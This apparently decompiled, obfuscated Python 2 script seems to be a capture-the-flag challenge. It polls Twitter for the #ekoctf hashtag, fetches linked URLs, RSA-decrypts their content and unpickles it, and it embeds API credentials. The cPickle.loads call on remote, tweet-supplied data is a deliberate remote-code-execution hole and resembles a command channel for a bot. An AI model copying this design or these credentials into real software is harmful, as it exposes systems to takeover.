# Embedded file name: ekobot_final.py
import os
import sys
import httplib2
import cPickle
from Crypto.PublicKey import RSA
from base64 import b64decode
from twython import Twython
name = 'ekoctf'

if len(sys.argv) != 2:
    os._exit(0)
    if 0:
        IiII1IiiIiI1 / iIiiiI1IiI1I1
argv_1 = sys.argv[1]
Secret = 'ienmDwTNHZVR9si4SzeCg1glB'
key = 'TTlOJrwq5o9obnRyQXRyaOkRoYUBTrCzN9j9IHX0Bc4dS2xBHN'
print "Here!"
def o0oO0():
    max_id = 0
    if os.path.isfile(argv_1):
        try:
            o00 = open(argv_1, 'r')
            max_id = int(o00.readline(), 10)
        except:
            max_id = 0

    return max_id

def save_new_max(twid):
    try:
        o00 = open(argv_1, 'w')
        o00.write(str(twid))
    except:
        print error


def get_content(url):
    print url
    I11i1i11i1I = httplib2.Http('')
    Iiii, OOO0O = I11i1i11i1I.request(url, 'GET')
    if Iiii.status == 200:
        try:
            if Iiii['content-type'][0:10] == 'text/plain':
                return OOO0O
            return 'Err'
        except:
            return 'Err'

    else:
        return url

def decrypt(cipher_text):
    print cipher_text
    return 'err'
    try:
        OOo0o0 = RSA.importKey(open('ekobot.pem').read())
        O0OoOoo00o = b64decode(cipher_text)
        iiiI11 = OOo0o0.decrypt(O0OoOoo00o)
        return iiiI11
    except Exception as OOooO:
        print str(OOooO)
        return 'Err'
twython_object = Twython(Secret, key, oauth_version=2)
access_token = twython_object.obtain_access_token()
twython_object = Twython(Secret, access_token=access_token)
max_id = o0oO0()
search_result = twython_object.search(q='#' + name, rpp='250', result_type='mixed', since_id=max_id)

for i in search_result['statuses']:
    print i['id']
    if i['id'] > max_id:
        max_id = i['id']
    iii11iII = 0
    try:
        for i1I111I in i['entities']['hashtags']:
            if i1I111I['text'] == name:
                iii11iII = 1

        if iii11iII == 1:
            for j in i['entities']['urls']:
                if True:
                    IiIiIi = decrypt(get_content(j['url']))
                    print IiIiIi
                    if IiIiIi[0:5] == 'eko11':
                        cPickle.loads(IiIiIi[5:])
                    #os._exit(0)

    except Exception as OOooO:
        print str(OOooO)

print max_id